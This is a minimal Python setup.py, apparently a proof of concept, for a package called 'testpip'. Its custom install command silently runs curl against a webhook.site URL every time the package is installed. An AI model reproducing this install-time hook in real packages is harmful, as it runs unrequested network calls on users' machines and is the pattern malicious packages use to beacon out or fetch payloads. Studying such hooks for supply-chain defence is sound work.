from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstallCommand(install):
    def run(self):
        print("[*] Running post-install code...")
        os.system("curl https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")
        install.run(self)

setup(
    name='testpip',
    version='0.1',
    packages=['testpip'],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
